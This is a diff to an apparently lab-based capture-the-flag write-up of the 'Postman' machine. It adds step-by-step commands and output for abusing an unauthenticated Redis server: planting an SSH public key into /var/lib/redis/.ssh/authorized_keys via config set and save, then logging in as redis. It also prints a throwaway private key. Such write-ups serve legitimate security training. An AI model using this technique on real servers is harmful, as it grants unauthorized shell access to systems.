@@ -93,8 +93,95 @@ OK
 
 ### Redis Exploitation
 
+```
+ssh-keygen -t ed25519 -f redis_key -N ""
+Generating public/private ed25519 key pair.
+Your identification has been saved in redis_key
+Your public key has been saved in redis_key.pub
+The key fingerprint is:
+SHA256:OWerVFPcQXj/oAl1QxcPglrYH4jUIOeWDNv0QBQfGq4 kali@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|      o+@B.o.+=.o|
+|       @oB*o+o++.|
+|      . Ooooo+.o.|
+|       o..... . .|
+|      E S =. o ..|
+|         = oo   .|
+|        . .      |
+|       . .       |
+|        .        |
++----[SHA256]-----+
+
+```
+
+```
+┌──(kali㉿kali)-[~/machines/postman]
+└─$ cat redis_key; echo -e "\n\n"
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD8wcvhMa8rLPUkgI1sCavJX4WlWAxved0VzrqAbrDPfQAAAJCiP5Unoj+V
+JwAAAAtzc2gtZWQyNTUxOQAAACD8wcvhMa8rLPUkgI1sCavJX4WlWAxved0VzrqAbrDPfQ
+AAAEDhaeZXSPE+YamMDx2Ex0CvsHA7nCBllMa64VQqQ1FhgPzBy+Exryss9SSAjWwJq8lf
+haVYDG953RXOuoBusM99AAAACWthbGlAa2FsaQECAwQ=
+-----END OPENSSH PRIVATE KEY-----
+
+
+
+                                                                                                                    
+┌──(kali㉿kali)-[~/machines/postman]
+└─$ (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt
+                                                                                                                    
+┌──(kali㉿kali)-[~/machines/postman]
+└─$ cat spaced_key.txt | redis-cli -h 10.129.140.170 -x set ssh_key
+OK
+
+```
+
+```
+ redis-cli -h 10.129.140.170
+10.129.140.170:6379> config set dir /var/lib/redis/.ssh
+OK
+10.129.140.170:6379> config set dbfilename "authorized_keys"
+OK
+10.129.140.170:6379> save
+OK
+10.129.140.170:6379> 
+
+```
+
+## Access as redis
+
+```
+ssh -i redis_key redis@10.129.140.170
+The authenticity of host '10.129.140.170 (10.129.140.170)' can't be established.
+ED25519 key fingerprint is: SHA256:eBdalosj8xYLuCyv0MFDgHIabjJ9l3TMv1GYjZdxY9Y
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:57: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.140.170' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~$ id
+uid=107(redis) gid=114(redis) groups=114(redis)
+redis@Postman:~$ 
+
+```
+
 ---
-## Foothold
+## Lateral movement
 
 How you gained initial access to the machine.
 
